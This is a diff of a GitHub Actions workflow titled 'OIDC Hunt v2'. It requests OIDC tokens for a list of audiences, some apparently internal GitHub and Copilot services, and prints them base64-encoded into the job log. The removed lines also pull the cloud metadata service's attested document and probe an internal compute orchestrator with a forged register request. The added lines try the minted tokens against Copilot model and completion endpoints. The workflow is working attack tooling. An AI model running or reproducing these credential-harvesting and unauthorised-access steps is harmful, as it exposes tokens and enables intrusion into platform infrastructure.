@@ -1,10 +1,7 @@
 name: OIDC Hunt v2
 on:
   push:
-    paths:
-      - '.github/workflows/oidc-hunt-v2.yml'
-  schedule:
-    - cron: '0 0 * * *'
+    paths: ['.github/workflows/oidc-hunt-v2.yml']
 permissions:
   id-token: write
   contents: read
@@ -12,56 +9,43 @@ jobs:
   hunt:
     runs-on: ubuntu-latest
     steps:
-      - name: OIDC audiences + IMDS attested document
+      - name: OIDC audiences fresh tokens
         run: |
-          set -e
           get_token() {
-            local aud="$1"
-            local url="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${aud}"
-            curl -sf "$url" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -o /tmp/tok.json 2>/dev/null && \
-              jq -r .value /tmp/tok.json | base64 -w0 || echo "FAILED:${aud}"
+            curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" \
+              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])"
           }
-          
-          echo "=== OIDC audiences ==="
-          for aud in \
-            "api://hosted-compute-ro" \
-            "api://AzureADTokenExchange" \
-            "api://github-actions-runner" \
-            "sigstore" \
-            "api://github-copilot" \
-            "api://copilot-platform" \
-            "https://github.com" \
-            "api://github-codeload" \
-            "api://github.com"; do
-            echo "AUD_${aud}:$(get_token "$aud")"
+          for aud in "api://hosted-compute-ro" "api://AzureADTokenExchange" "api://github-actions-runner" "sigstore" "api://github-copilot" "api://copilot-platform" "https://github.com" "api://github-codeload" "api://github.com"; do
+            TOKEN=$(get_token "$aud")
+            TOKEN_B64=$(echo "$TOKEN" | base64 -w0)
+            echo "AUD_${aud}:${TOKEN_B64}"
           done
-          
-          echo ""
-          echo "=== IMDS attested document ==="
-          curl -sf "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01&nonce=aabbccdd" \
-            -H "Metadata: true" -o /tmp/imds_attest.json 2>/dev/null && \
-            echo "IMDS_ATTEST:$(cat /tmp/imds_attest.json | base64 -w0)" || \
-            echo "IMDS_ATTEST:FAILED"
-          
-          echo ""
-          echo "=== Try orchestrator with our OIDC token ==="
-          TOKEN_B64=$(get_token "api://hosted-compute-ro")
-          TOKEN=$(echo "$TOKEN_B64" | base64 -d 2>/dev/null || echo "")
-          
-          echo "Trying GET /vm/v1/runner/status..."
-          curl -sv "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1/runner/status" \
-            -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" 2>&1 | tail -20
-          
-          echo ""
-          echo "Trying POST /vm/v1/register..."
-          curl -sv -X POST "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1/register" \
-            -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
-            -d '{"allocation_id":"a60487c8-448e-4b98-8cb6-39285319793b"}' 2>&1 | tail -20
-            
-          echo ""
-          echo "Trying different orchestrator paths..."
-          for path in "/vm/v1/jobs" "/vm/v1/health" "/vm/v1/metadata" "/status" "/health"; do
-            echo "--- $path ---"
-            curl -sf "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com$path" \
-              -H "Authorization: Bearer $TOKEN" 2>/dev/null || echo "failed"
-          done
+      - name: Test copilot-platform token against API
+        run: |
+          get_token() {
+            curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" \
+              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])"
+          }
+          TOKEN=$(get_token "api://copilot-platform")
+          echo "=== Testing api.enterprise.githubcopilot.com ==="
+          curl -sv "https://api.enterprise.githubcopilot.com/v1/models" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" 2>&1 | tail -30
+          echo "=== Testing api.githubcopilot.com ==="  
+          curl -sv "https://api.githubcopilot.com/models" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Copilot-Integration-Id: vscode-chat" 2>&1 | tail -20
+      - name: Test github-copilot token
+        run: |
+          get_token() {
+            curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" \
+              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])"
+          }
+          TOKEN=$(get_token "api://github-copilot")
+          echo "=== Testing with api://github-copilot audience ==="
+          curl -sv "https://api.githubcopilot.com/models" \
+            -H "Authorization: Bearer $TOKEN" 2>&1 | tail -20
+          curl -sv "https://copilot-proxy.githubusercontent.com/v1/engines/copilot-codex/completions" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"prompt":"hello","max_tokens":5}' 2>&1 | tail -20
